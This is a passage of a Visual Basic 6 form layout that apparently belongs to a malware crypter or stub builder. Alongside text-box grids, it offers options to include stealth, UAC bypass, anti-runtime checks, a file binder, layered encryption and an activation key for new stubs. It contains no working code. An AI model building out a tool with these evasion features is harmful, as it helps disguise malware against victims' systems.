   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   8
      Left            =   13320
      TabIndex        =   168
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   7
      Left            =   13560
      TabIndex        =   167
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   6
      Left            =   13800
      TabIndex        =   166
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   5
      Left            =   14040
      TabIndex        =   165
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   4
      Left            =   13080
      TabIndex        =   164
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   3
      Left            =   12120
      TabIndex        =   163
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   2
      Left            =   12360
      TabIndex        =   162
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   1
      Left            =   12600
      TabIndex        =   161
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   0
      Left            =   12840
      TabIndex        =   160
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtFunc 
      Height          =   285
      Index           =   21
      Left            =   11880
      TabIndex        =   159
      Top             =   5280
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   30
      Left            =   13080
      TabIndex        =   158
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   29
      Left            =   13320
      TabIndex        =   157
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   28
      Left            =   13560
      TabIndex        =   156
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   27
      Left            =   12840
      TabIndex        =   155
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   26
      Left            =   14040
      TabIndex        =   154
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   25
      Left            =   14280
      TabIndex        =   153
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   24
      Left            =   14520
      TabIndex        =   152
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   23
      Left            =   13800
      TabIndex        =   151
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   22
      Left            =   14040
      TabIndex        =   150
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   21
      Left            =   14280
      TabIndex        =   149
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   20
      Left            =   14520
      TabIndex        =   148
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   19
      Left            =   13800
      TabIndex        =   147
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   18
      Left            =   12120
      TabIndex        =   146
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   17
      Left            =   12360
      TabIndex        =   145
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   16
      Left            =   12600
      TabIndex        =   144
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   15
      Left            =   11880
      TabIndex        =   143
      Top             =   4680
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   14
      Left            =   13080
      TabIndex        =   142
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   13
      Left            =   13320
      TabIndex        =   141
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   12
      Left            =   13560
      TabIndex        =   140
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   11
      Left            =   12840
      TabIndex        =   139
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   10
      Left            =   14040
      TabIndex        =   138
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   9
      Left            =   14280
      TabIndex        =   137
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   8
      Left            =   14520
      TabIndex        =   136
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   7
      Left            =   13800
      TabIndex        =   135
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   6
      Left            =   14040
      TabIndex        =   134
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   5
      Left            =   14280
      TabIndex        =   133
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   4
      Left            =   14520
      TabIndex        =   132
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   3
      Left            =   13800
      TabIndex        =   131
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   2
      Left            =   12120
      TabIndex        =   130
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   1
      Left            =   12360
      TabIndex        =   129
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   0
      Left            =   12600
      TabIndex        =   128
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox TxtSub 
      Height          =   285
      Index           =   31
      Left            =   11880
      TabIndex        =   127
      Top             =   4200
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   53
      Left            =   15240
      TabIndex        =   126
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   52
      Left            =   15480
      TabIndex        =   125
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   51
      Left            =   15720
      TabIndex        =   124
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   50
      Left            =   15960
      TabIndex        =   123
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   49
      Left            =   15000
      TabIndex        =   122
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   48
      Left            =   14760
      TabIndex        =   121
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   47
      Left            =   13800
      TabIndex        =   120
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   46
      Left            =   14040
      TabIndex        =   119
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   45
      Left            =   14280
      TabIndex        =   118
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   44
      Left            =   14520
      TabIndex        =   117
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   43
      Left            =   13560
      TabIndex        =   116
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   42
      Left            =   13320
      TabIndex        =   115
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   41
      Left            =   12360
      TabIndex        =   114
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   40
      Left            =   12600
      TabIndex        =   113
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   39
      Left            =   12840
      TabIndex        =   112
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   38
      Left            =   13080
      TabIndex        =   111
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   37
      Left            =   12120
      TabIndex        =   110
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   36
      Left            =   11880
      TabIndex        =   109
      Top             =   3600
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   35
      Left            =   15240
      TabIndex        =   108
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   34
      Left            =   15480
      TabIndex        =   107
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   33
      Left            =   15720
      TabIndex        =   106
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   32
      Left            =   15960
      TabIndex        =   105
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   31
      Left            =   15000
      TabIndex        =   104
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   30
      Left            =   14760
      TabIndex        =   103
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   29
      Left            =   13800
      TabIndex        =   102
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   28
      Left            =   14040
      TabIndex        =   101
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   27
      Left            =   14280
      TabIndex        =   100
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   26
      Left            =   14520
      TabIndex        =   99
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   25
      Left            =   13560
      TabIndex        =   98
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   24
      Left            =   13320
      TabIndex        =   97
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   23
      Left            =   12360
      TabIndex        =   96
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   22
      Left            =   12600
      TabIndex        =   95
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   21
      Left            =   12840
      TabIndex        =   94
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   20
      Left            =   13080
      TabIndex        =   93
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   19
      Left            =   12120
      TabIndex        =   92
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   18
      Left            =   11880
      TabIndex        =   91
      Top             =   3240
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   17
      Left            =   15240
      TabIndex        =   90
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   16
      Left            =   15480
      TabIndex        =   89
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   15
      Left            =   15720
      TabIndex        =   88
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   14
      Left            =   15960
      TabIndex        =   87
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   13
      Left            =   15000
      TabIndex        =   86
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   12
      Left            =   14760
      TabIndex        =   85
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   11
      Left            =   13800
      TabIndex        =   84
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   10
      Left            =   14040
      TabIndex        =   83
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   9
      Left            =   14280
      TabIndex        =   82
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   8
      Left            =   14520
      TabIndex        =   81
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   7
      Left            =   13560
      TabIndex        =   80
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   6
      Left            =   13320
      TabIndex        =   79
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   5
      Left            =   12360
      TabIndex        =   78
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   4
      Left            =   12600
      TabIndex        =   77
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   3
      Left            =   12840
      TabIndex        =   76
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   2
      Left            =   13080
      TabIndex        =   75
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   1
      Left            =   12120
      TabIndex        =   74
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Dec 
      Height          =   285
      Index           =   0
      Left            =   11880
      TabIndex        =   73
      Top             =   2880
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   27
      Left            =   14280
      TabIndex        =   72
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   26
      Left            =   14040
      TabIndex        =   71
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   25
      Left            =   13800
      TabIndex        =   70
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   24
      Left            =   13560
      TabIndex        =   69
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   23
      Left            =   13320
      TabIndex        =   68
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   22
      Left            =   13080
      TabIndex        =   67
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   21
      Left            =   12840
      TabIndex        =   66
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   20
      Left            =   12600
      TabIndex        =   65
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   19
      Left            =   14520
      TabIndex        =   64
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   18
      Left            =   14760
      TabIndex        =   63
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   17
      Left            =   15000
      TabIndex        =   62
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   16
      Left            =   15240
      TabIndex        =   61
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   15
      Left            =   15480
      TabIndex        =   60
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   14
      Left            =   15720
      TabIndex        =   59
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   13
      Left            =   15960
      TabIndex        =   58
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   12
      Left            =   16200
      TabIndex        =   57
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   11
      Left            =   12120
      TabIndex        =   56
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   10
      Left            =   11880
      TabIndex        =   55
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   9
      Left            =   11880
      TabIndex        =   54
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   8
      Left            =   12120
      TabIndex        =   53
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   7
      Left            =   12360
      TabIndex        =   52
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   6
      Left            =   12600
      TabIndex        =   51
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   5
      Left            =   12840
      TabIndex        =   50
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   4
      Left            =   13080
      TabIndex        =   49
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   3
      Left            =   13320
      TabIndex        =   48
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   2
      Left            =   13560
      TabIndex        =   47
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   0
      Left            =   13800
      TabIndex        =   46
      Top             =   2040
      Width           =   185
   End
   Begin VB.TextBox Cst 
      Height          =   285
      Index           =   1
      Left            =   12360
      TabIndex        =   45
      Top             =   1680
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   44
      Left            =   12240
      TabIndex        =   44
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   43
      Left            =   12480
      TabIndex        =   43
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   42
      Left            =   12720
      TabIndex        =   42
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   41
      Left            =   12960
      TabIndex        =   41
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   40
      Left            =   13200
      TabIndex        =   40
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   39
      Left            =   13440
      TabIndex        =   39
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   38
      Left            =   13680
      TabIndex        =   38
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   37
      Left            =   13920
      TabIndex        =   37
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   36
      Left            =   14160
      TabIndex        =   36
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   35
      Left            =   14400
      TabIndex        =   35
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   34
      Left            =   14640
      TabIndex        =   34
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   33
      Left            =   14880
      TabIndex        =   33
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   32
      Left            =   15120
      TabIndex        =   32
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   31
      Left            =   15360
      TabIndex        =   31
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   30
      Left            =   15600
      TabIndex        =   30
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   29
      Left            =   15840
      TabIndex        =   29
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   28
      Left            =   16080
      TabIndex        =   28
      Top             =   120
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   27
      Left            =   12000
      TabIndex        =   27
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   26
      Left            =   12240
      TabIndex        =   26
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   25
      Left            =   12480
      TabIndex        =   25
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   24
      Left            =   12720
      TabIndex        =   24
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   23
      Left            =   12960
      TabIndex        =   23
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   22
      Left            =   13200
      TabIndex        =   22
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   21
      Left            =   13440
      TabIndex        =   21
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   20
      Left            =   13680
      TabIndex        =   20
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   19
      Left            =   13920
      TabIndex        =   19
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   18
      Left            =   14160
      TabIndex        =   18
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   17
      Left            =   14400
      TabIndex        =   17
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   16
      Left            =   14640
      TabIndex        =   16
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   15
      Left            =   14880
      TabIndex        =   15
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   14
      Left            =   15120
      TabIndex        =   14
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   13
      Left            =   15360
      TabIndex        =   13
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   12
      Left            =   15600
      TabIndex        =   12
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   11
      Left            =   15840
      TabIndex        =   11
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   10
      Left            =   16080
      TabIndex        =   10
      Top             =   480
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   9
      Left            =   12000
      TabIndex        =   9
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   8
      Left            =   12240
      TabIndex        =   8
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   7
      Left            =   12480
      TabIndex        =   7
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   6
      Left            =   12720
      TabIndex        =   6
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   5
      Left            =   12960
      TabIndex        =   5
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   4
      Left            =   13200
      TabIndex        =   4
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   3
      Left            =   13440
      TabIndex        =   3
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   2
      Left            =   13680
      TabIndex        =   2
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   1
      Left            =   13920
      TabIndex        =   1
      Top             =   840
      Width           =   185
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Index           =   0
      Left            =   12000
      TabIndex        =   0
      Top             =   120
      Width           =   185
   End
   Begin XtremeSuiteControls.ProgressBar PB 
      Height          =   255
      Left            =   120
      TabIndex        =   425
      Top             =   5880
      Width           =   9255
      _Version        =   851968
      _ExtentX        =   16325
      _ExtentY        =   450
      _StockProps     =   93
      BackColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Scrolling       =   1
      Appearance      =   2
      UseVisualStyle  =   0   'False
      BarColor        =   16777152
      MarqueeDelay    =   20
   End
   Begin XtremeSuiteControls.GroupBox GroupBox3 
      Height          =   3135
      Left            =   120
      TabIndex        =   378
      Top             =   2640
      Width           =   2775
      _Version        =   851968
      _ExtentX        =   4895
      _ExtentY        =   5530
      _StockProps     =   79
      Caption         =   "Optional Stub Data [Features]"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
      Begin VB.CheckBox Check26 
         Caption         =   "Include Stealth Options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   382
         Top             =   720
         Value           =   1  'Checked
         Width           =   1815
      End
      Begin VB.CheckBox Check19 
         Caption         =   "Include Bypass UAC"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   381
         Top             =   1440
         Value           =   1  'Checked
         Width           =   1695
      End
      Begin VB.CheckBox Check17 
         Caption         =   "Include Anti Runtimes"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   380
         Top             =   360
         Value           =   1  'Checked
         Width           =   1695
      End
      Begin VB.CheckBox Check15 
         Caption         =   "Include File Binder"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   379
         Top             =   1080
         Value           =   1  'Checked
         Width           =   1935
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   285
         Index           =   7
         Left            =   600
         TabIndex        =   418
         Top             =   2670
         Width           =   1215
         _Version        =   851968
         _ExtentX        =   2143
         _ExtentY        =   503
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.ComboBox ComboBox1 
         Height          =   285
         Index           =   8
         Left            =   600
         TabIndex        =   435
         Top             =   2070
         Width           =   1215
         _Version        =   851968
         _ExtentX        =   2143
         _ExtentY        =   503
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Style           =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
         Text            =   "ComboBox1"
      End
      Begin XtremeSuiteControls.CheckBox CheckBox1 
         Height          =   255
         Left            =   240
         TabIndex        =   436
         Top             =   1800
         Width           =   1455
         _Version        =   851968
         _ExtentX        =   2566
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "First Encryption"
         Enabled         =   0   'False
         Appearance      =   2
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox CheckBox2 
         Height          =   255
         Left            =   240
         TabIndex        =   437
         Top             =   2400
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Second Encryption"
         Appearance      =   2
      End
   End
   Begin XtremeSuiteControls.Label Label19 
      Height          =   255
      Left            =   120
      TabIndex        =   429
      Top             =   6240
      Width           =   2775
      _Version        =   851968
      _ExtentX        =   4895
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Enter activation key, request new stub"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.Label Label20 
      Height          =   255
      Left            =   3240
      TabIndex        =   427
      Top             =   6240
      Width           =   1095
      _Version        =   851968
      _ExtentX        =   1931
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Activation Key"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
